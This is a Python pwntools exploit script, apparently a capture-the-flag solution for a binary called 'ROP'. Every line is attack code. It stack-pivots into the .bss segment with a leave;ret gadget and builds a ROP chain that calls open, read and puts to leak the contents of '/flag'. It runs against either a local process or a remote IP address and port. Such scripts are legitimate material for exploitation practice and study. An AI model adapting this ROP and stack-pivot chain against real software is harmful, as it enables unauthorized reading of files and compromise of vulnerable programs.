#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
# context.log_level = "debug"
if debug == 1:
    p = process('./ROP')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 20300)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./ROP', checksec=False)
plt_open = elf.plt['open']
plt_read = elf.plt['read']
plt_puts = elf.plt['puts']
rop_pop_rdi_ret = 0x400a43
rop_pop_rsi_pop_r15_ret = 0x400a41
rop_leave_ret = 0x40090d
addr_bss = 0x6010A0
addr_main = 0x4009BA

# gdb.attach(p, "b *0x4009cb\nc")
pd = p64(addr_bss + 0x8)
pd += p64(rop_pop_rdi_ret)
pd += p64(addr_bss + 0x80)
pd += p64(rop_pop_rsi_pop_r15_ret)
pd += p64(0)
pd += p64(0)
pd += p64(plt_open)
pd += p64(rop_pop_rdi_ret)
pd += p64(4)
pd += p64(rop_pop_rsi_pop_r15_ret)
pd += p64(addr_bss - 0x30)
pd += p64(0x30)
pd += p64(plt_read)
pd += p64(rop_pop_rdi_ret)
pd += p64(addr_bss - 0x30)
pd += p64(plt_puts)
pd += '/flag'
p.sendafter("It's just a little bit harder...Do you think so?\n", pd)

pd = 'a' * 0x50
pd += p64(addr_bss)
pd += p64(rop_leave_ret)
p.sendafter('/flag\n\n', pd)
p.interactive()
